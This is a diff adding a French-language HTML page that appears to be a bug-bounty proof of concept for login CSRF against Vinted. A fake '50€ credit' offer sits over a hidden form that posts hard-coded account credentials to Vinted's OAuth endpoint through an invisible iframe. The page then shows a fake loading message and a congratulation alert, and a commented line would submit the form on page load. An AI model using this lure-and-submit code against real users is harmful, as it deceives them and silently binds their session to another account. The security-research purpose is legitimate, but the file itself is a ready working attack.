@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Gagnez 50€ sur Vinted !</title>
+    <style>
+        body { font-family: Arial; padding: 20px; }
+        .offer { background: gold; padding: 20px; border-radius: 10px; }
+        .hidden-frame { 
+            width: 0; 
+            height: 0; 
+            border: none; 
+            position: absolute; 
+            top: -1000px;
+        }
+    </style>
+</head>
+<body>
+    <div class="offer">
+        <h1>🎉 Offre Spéciale Vinted ! 🎉</h1>
+        <p>Cliquez ci-dessous pour gagner 50€ de crédit :</p>
+        <button onclick="triggerAttack()">Cliquer pour gagner</button>
+        <p><small>Vous serez redirigé vers Vinted après validation</small></p>
+    </div>
+    
+    <!-- Frame pour capturer la réponse -->
+    <iframe id="response-frame" class="hidden-frame" name="csrf-frame"></iframe>
+    
+    <!-- Formulaire CSRF caché -->
+    <form id="csrf-form" action="https://www.vinted.fr/web/api/auth/oauth" 
+          method="POST" target="csrf-frame" 
+          enctype="application/x-www-form-urlencoded">
+        <input type="hidden" name="client_id" value="web">
+        <input type="hidden" name="scope" value="user">
+        <input type="hidden" name="username" value="raz_26+2@intigriti.me">
+        <input type="hidden" name="password" value="Vh5:U&fGd2mk:sy">
+        <input type="hidden" name="grant_type" value="password">
+    </form>
+
+    <script>
+        function triggerAttack() {
+            // Montre un faux loading
+            document.querySelector('.offer').innerHTML = 
+                '<h2>⏳ Vérification en cours...</h2>' +
+                '<p>Connexion à Vinted...</p>';
+            
+            // Soumet le formulaire CSRF
+            document.getElementById('csrf-form').submit();
+            
+            // Attend 2 secondes et redirige
+            setTimeout(() => {
+                window.location.href = 'https://www.vinted.fr';
+                alert('🎉 Félicitations ! Vous êtes maintenant connecté avec 50€ de crédit !');
+            }, 2000);
+        }
+        
+        // Version automatique (décommentez pour tester)
+        // setTimeout(triggerAttack, 3000);
+    </script>
+</body>
+</html>
